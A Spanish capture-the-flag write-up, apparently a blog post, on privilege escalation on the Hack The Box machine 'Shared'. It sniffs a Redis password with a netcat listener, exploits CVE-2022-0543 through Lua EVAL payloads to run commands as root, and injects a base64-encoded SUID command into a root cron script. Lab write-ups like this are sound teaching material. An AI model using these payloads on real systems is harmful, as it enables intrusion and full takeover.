</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Al igual que con el usuario anterior, hacemos una enumeraci√≥n b√°sica de nuestro usuario y nos damos cuenta que pertenece al grupo <code class="language-plaintext highlighter-rouge">1003(sysadmin)</code>, entonces buscamos directorios y archivos con ese <strong>GUI (Group ID)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">dan_smith@shared:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
</span><span class="gp">dan_smith@shared:~$</span><span class="w"> </span>find / <span class="nt">-group</span> 1003 2&gt;/dev/null
<span class="go">/usr/local/bin/redis_connector_dev
</span></pre></table></code></div></div><p>En contramos el binario <strong>/usr/local/bin/redis_connector_dev</strong>, lo ejecutamos y nos muestra lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">dan_smith@shared:~$</span><span class="w"> </span>/usr/local/bin/redis_connector_dev
<span class="go">[+] Logging to redis instance using password...

INFO command result:
</span><span class="gp">#</span><span class="w"> </span>Server
<span class="go">redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:27580
run_id:52a282d2b4b882075ba776fde63771afa60e80cf
tcp_port:6379
uptime_in_seconds:5
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:16525803
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
</span><span class="gp"> &lt;nil&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Nos muestra un mensaje que se esta logeando a <code class="language-plaintext highlighter-rouge">redis</code>. <strong>Redis</strong> es un motor de base de datos en memoria que almacena la informaci√≥n de la forma <strong>clave-valor</strong></p><p>Entonces como nos muestra la versi√≥n intentamos encontrar algunar vulnerabilidades, encontramos varias, pero para poder ejecutarlas necesitabamos autenticarnos en la interfaz de redis con <code class="language-plaintext highlighter-rouge">redis-cli</code></p><p>Nuestro objetivo ahora es lograr authenticarnos. Si nos fijamos bien, el binario anterior <strong>/usr/local/bin/redis_connector_dev</strong> nos muestra el mensaje <strong>[+] Logging to redis instance using password‚Ä¶</strong>. Al parecer al ejecutar el script, este se intenta conectar a <code class="language-plaintext highlighter-rouge">redis</code> y al entablar la conexi√≥n se autentica y recibimos ese output de informmaci√≥n. ¬ø Pero en qu√© puerto ?, sencillo, el puerto por defecto de <code class="language-plaintext highlighter-rouge">redis</code> es el <strong>6379</strong></p><blockquote><p>Listamos los puertos</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">dan_smith@shared:~$</span><span class="w"> </span>netstat <span class="nt">-tulnp</span>
<span class="go">(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6379 &lt;- Here! 0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                
</span></pre></table></code></div></div><p>Encontramos que est√° en escucha pero solo de manera local (127.0.0.1 loopback addres). Entonces como no podemos interceptar el binario de manera externa, por ello pasamos el binario a nuestra m√°quina y lo ejecutamos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">‚ùØ chmod +x redis_connector_dev
‚ùØ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp 127.0.0.1:6379: connect: connection refused
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></pre></table></code></div></div><p>Al ejecutarlo nos sale un error de conexi√≥n rechazada sobre <strong>127.0.0.1:6379</strong>, lo que pasa es que el binario est√° intentando ingresar a <code class="language-plaintext highlighter-rouge">redis</code> por el puerto <strong>6379</strong></p><p>Entonces lo que hacemos es abrir el puerto <strong>6379</strong> para esperar esa conexi√≥n y recibir la contrase√±a de la autenticaci√≥n:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="go">‚ùØ chmod +x redis_connector_dev
‚ùØ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp 127.0.0.1:6379: connect: connection refused &lt;------- Connection failed (1)
‚ùØ ./redis_connector_dev
[+] Logging to redis instance using password...       &lt;------- Successfull connection (3)

INFO command result:
 i/o timeout

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚ùØ nc -lvnp 6379					     &lt;-------- Open port (2)
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6379
Ncat: Listening on 0.0.0.0:6379
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51178.
*2
</span><span class="gp">$</span>4
<span class="go">auth
</span><span class="gp">$</span>16
<span class="go">F2WHqJUz2WEz=Gqq &lt;------- Password
</span></pre></table></code></div></div><p>Al conectarnos vemos varios simbolos, pues esto se debe a que los clientes <code class="language-plaintext highlighter-rouge">redis</code> usan el protocolo <strong>RESP(REdis Serialization Protocol)</strong> para comunicarse con el servidor. Cuando se realiza la petici√≥n, estos datos se trasmiten como un <strong>arreglo de strings</strong>, aqu√≠ la explicaci√≥n de los s√≠mbolos:</p><p><img data-src="/assets/img/htb/writeups/shared/resp_protocol.png" alt="RESPProtocol" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>M√°s informacions sobre <a href="https://redis.io/docs/reference/protocol-spec/">RESP protocol</a></p></div></blockquote><p>Como ya tenemos una autenticaci√≥n exitosa, ahora toca intentar explotar distintas vulnerabilidades que existen para <code class="language-plaintext highlighter-rouge">redis</code></p><p>Usamos como fuente la biblia de los Hacker <strong>Hacktricks</strong>, en mi caso solo me funcion√≥ usar la forma <strong>Lua sandbox byass</strong>, especificamente <strong>CVE-2022-0543</strong> que consiste en poder insertar c√≥digo <strong>Lua</strong> (lenguaje que aporta al funcionamiento de <code class="language-plaintext highlighter-rouge">Redis</code>) a traves del comando <strong>EVAL</strong> y con ello ejecutar c√≥digo remoto</p><p>Antes tenemos que verificar que este proceso est√° siendo ejecutado como el usuario privilegiado, as√≠ que listamos r√°pidamente los procesos del sistema y confirmamos que el usuario <code class="language-plaintext highlighter-rouge">root</code> es quien est√° iniciando el servidor <code class="language-plaintext highlighter-rouge">redis</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">dan_smith@shared:/tmp$</span><span class="w"> </span>ps aux
<span class="c">...
</span><span class="go">root       30024  0.2  0.7  65104 14664 ?        Ssl  21:13   0:00 /usr/bin/redis-server 127.0.0.1:6379 &lt;----- Root
dan_smi+   30030  0.0  0.1   9700  3192 pts/2    R+   21:13   0:00 ps aux
</span></pre></table></code></div></div><p>Ahora procedemos a la explotaci√≥n:</p><blockquote><p>C√≥digo <code class="language-plaintext highlighter-rouge">lua</code> que useremos</p></blockquote><div class="language-lua highlighter-rouge"><div class="code-header"> <span data-label-text="Lua"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">#</span> <span class="n">Guardamos</span> <span class="n">en</span> <span class="n">una</span> <span class="n">variable</span> <span class="n">el</span> <span class="n">nombre</span> <span class="n">de</span> <span class="n">inicializaci</span><span class="err">√≥</span><span class="n">n</span> <span class="n">del</span> <span class="n">paquete</span> <span class="n">Lua</span> <span class="n">que</span> <span class="n">usaremos</span>
<span class="kd">local</span> <span class="n">io_l</span> <span class="o">=</span> <span class="nb">package.loadlib</span><span class="p">(</span><span class="s2">"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0"</span><span class="p">,</span> <span class="s2">"luaopen_io"</span><span class="p">);</span> 

<span class="o">#</span> <span class="n">Inicializamos</span> <span class="n">el</span> <span class="n">paquete</span> <span class="n">guard</span><span class="err">√°</span><span class="n">ndolo</span> <span class="n">en</span> <span class="n">una</span> <span class="n">variable</span>
<span class="kd">local</span> <span class="n">io</span> <span class="o">=</span> <span class="n">io_l</span><span class="p">();</span>

<span class="o">#</span> <span class="n">Accedemos</span> <span class="n">a</span> <span class="n">la</span> <span class="n">funci</span><span class="err">√≥</span><span class="n">n</span> <span class="s1">'popen'</span> <span class="n">que</span> <span class="n">nos</span> <span class="n">permite</span> <span class="n">ejecutar</span> <span class="n">comandos</span> <span class="p">{</span><span class="n">command</span><span class="p">}</span> <span class="n">mostrando</span> <span class="n">como</span> <span class="n">output</span> <span class="n">un</span> <span class="n">archivo</span>
<span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">"{command}"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span> 

<span class="o">#</span> <span class="n">Leemos</span> <span class="n">el</span> <span class="n">archivo</span> <span class="n">y</span> <span class="n">guardamos</span> <span class="n">su</span> <span class="n">contenido</span>
<span class="kd">local</span> <span class="n">res</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*a"</span><span class="p">);</span> 

<span class="o">#</span> <span class="n">Cerramos</span> <span class="n">el</span> <span class="n">archivo</span>
<span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">();</span> 

<span class="o">#</span> <span class="n">Retornamos</span> <span class="n">la</span> <span class="n">salida</span> <span class="n">del</span> <span class="n">comando</span>
<span class="k">return</span> <span class="n">res</span>
</pre></table></code></div></div><blockquote><p>Entramos a la interfaz de redis <code class="language-plaintext highlighter-rouge">redis-cli</code> y usando el comando <strong>EVAL</strong> ejecutamos el script anterior con el comando <code class="language-plaintext highlighter-rouge">whoami</code>:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">dan_smith@shared:/tmp$</span><span class="w"> </span>redis-cli <span class="nt">-a</span> <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
<span class="go">Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w"> </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">"root\n"
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w"> 
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>El ‚Äò0‚Äô del final indica que no pasamos ning√∫n argumento al script</p></div></blockquote><p>Conseguimos ejecutar comandos como el usuario <code class="language-plaintext highlighter-rouge">root</code>, ahora tenemos que buscar una manera ganar acceso completo a una shell</p><blockquote><p>Intentamos asignarle permisos <strong>SUID</strong> a la bash pero no logramos que funcione</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("chmod u+s /bin/bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">""
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">"-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
</span></pre></table></code></div></div><p>Pero existe otra alternativa, al listar lo procesos del sistema con la herramienta <code class="language-plaintext highlighter-rouge">pspy</code> encontramos que el usuario <code class="language-plaintext highlighter-rouge">root</code> ejecuta el siguiente script:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">2022/08/16 22:44:01 CMD: UID=0    PID=32279  | /bin/bash /root/c.sh 
2022/08/16 22:44:01 CMD: UID=0    PID=32280  | sleep 5 
2022/08/16 22:44:01 CMD: UID=1001 PID=32281  | /usr/bin/python3 /usr/local/bin/ipython 
2022/08/16 22:44:06 CMD: UID=0    PID=32283  | rm -rf /opt/scripts_review/* 
</span><span class="gp">2022/08/16 22:44:06 CMD: UID=0    PID=32286  | perl -ne s/\((\d+)\)/print " $</span>1<span class="s2">"/ge 
</span><span class="go">2022/08/16 22:44:06 CMD: UID=0    PID=32285  | /bin/bash /root/c.sh 
2022/08/16 22:44:06 CMD: UID=0    PID=32284  | /bin/bash /root/c.sh
</span></pre></table></code></div></div><p>Observamos varios veces la ejecuci√≥n del script <code class="language-plaintext highlighter-rouge">c.sh</code>, el cu√°l es una tarea <strong>cron</strong> que se ejecutar√° cada cierto tiempo. Entonces aplicamos lo mismo que antes y agregamos con el operador <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> el comando <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code>:</p><blockquote><p>Para evitar problemas de sint√°xis con los simbolos codificamos el comando en <code class="language-plaintext highlighter-rouge">base64</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">‚ùØ echo "echo 'chmod u+s /bin/bash' &gt;</span><span class="o">&gt;</span> /root/c.sh<span class="s2">" | base64
</span><span class="go">ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo=
</span></pre></table></code></div></div><p>Ahora pasamos la cadena y lo decodificamos de vuelta para luego interpretarla con bash:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">"-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">""
</span></pre></table></code></div></div><p>Por √∫ltimo esperamos unos segundos, volvemos a listar la <code class="language-plaintext highlighter-rouge">bash</code>, y ya tendremos asignado el permiso <strong>SUID</strong>. As√≠ que lo ejecutamos como el propietario <code class="language-plaintext highlighter-rouge">bash -p</code>, conseguimos el acceso y la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">""
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w">  </span>EVAL <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="go">"-rwsr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
</span><span class="gp">127.0.0.1:6379&gt;</span><span class="w"> </span><span class="nb">exit</span>
<span class="gp">dan_smith@shared:/tmp$</span><span class="w"> </span>bash <span class="nt">-p</span>
<span class="gp">bash-5.1#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-5.1#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root     root     33 Aug 16 09:09 /root/root.txt
</span></pre></table></code></div></div><blockquote><p>Existe un exploit para la vulnerabilidad en cuesti√≥n <strong>CVE-2022-0543</strong>, el problema es que nos est√° el modulo <code class="language-plaintext highlighter-rouge">redis</code> instalado en la m√°quina. As√≠ que si lo quieres probar puedes user la herramienta <code class="language-plaintext highlighter-rouge">chisel</code> para redirigir el puerto de <code class="language-plaintext highlighter-rouge">redis</code>(6379) a t√∫ m√°quina y con ello explotar la vulnerabilidad con los modulos correctamente instalados</p></blockquote><p>No olvides que al usar el exploit del <strong>CVE</strong> tienes que agregar al objeto redis la contrase√±a con la par√°metro <em>password</em></p><blockquote class="prompt-info"><div><p>Aqu√≠ puedes descargar <a href="https://github.com/jpillora/chisel">Chisel</a> y el exploit <a href="https://github.com/aodsec/CVE-2022-0543">CVE-2022-0543</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLI</a> <a href="/tags/ipython/" class="post-tag no-text-decoration" >IPython</a> <a href="/tags/redis/" class="post-tag no-text-decoration" >Redis</a> <a href="/tags/lua/" class="post-tag no-text-decoration" >Lua</a> <a href="/tags/cve-2022-21699/" class="post-tag no-text-decoration" >CVE-2022-21699</a> <a href="/tags/cve-2022-0543/" class="post-tag no-text-decoration" >CVE-2022-0543</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Shared - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBShared/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Shared - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBShared/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBShared/&amp;text=Hackthebox Writeup Shared - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBZipping/"><div class="card-body"> <em class="timeago small" data-ts="1694710800" > 2023-09-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Zipping Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.229/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div><div class="card"> <a href="/posts/HTBUndetected/"><div class="card-body"> <em class="timeago small" data-ts="1650704859" > 2022-04-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Undetected</h3><div class="text-muted small"><p> M√°quina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permit√≠a Remote Code Execution (RCE) ...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask‚Äôs Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBFaculty/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Faculty</p></a> <a href="/posts/HTBCarpediem/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Carpediem</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://twitter.com/username">Marsello Guill√©n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" 